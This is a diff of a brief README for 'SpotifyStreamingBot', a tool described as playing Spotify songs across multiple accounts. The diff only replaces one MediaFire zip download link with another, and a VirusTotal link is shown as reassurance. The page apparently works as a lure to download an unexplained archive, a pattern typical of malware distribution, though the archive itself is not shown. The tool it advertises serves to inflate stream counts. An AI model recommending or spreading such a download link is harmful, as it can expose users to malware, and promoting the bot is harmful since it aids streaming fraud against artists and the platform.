@@ -1,5 +1,5 @@
 # SpotifyStreamingBot
-:heartpulse:[TAP FOR DOWNLOAD](https://www.mediafire.com/file/p9f1uhkav7dmiz6/SpotifyStreamingBot.zip/file)💗  
+:heartpulse:[TAP FOR DOWNLOAD](https://www.mediafire.com/file/0h8xzjtqupjo4h4/SpotifyStreamingBot.zip/file)💗  
 Virustotal result https://www.virustotal.com/gui/file/9a0d51056f76f9b3f7adc2ee352840fff3d884ce57f53f58f2611a1a0e65e402?nocache=1
 # SpotifyStreamingBot
  Simple tool which plays spotify songs between the given amount of time with multiple accounts.
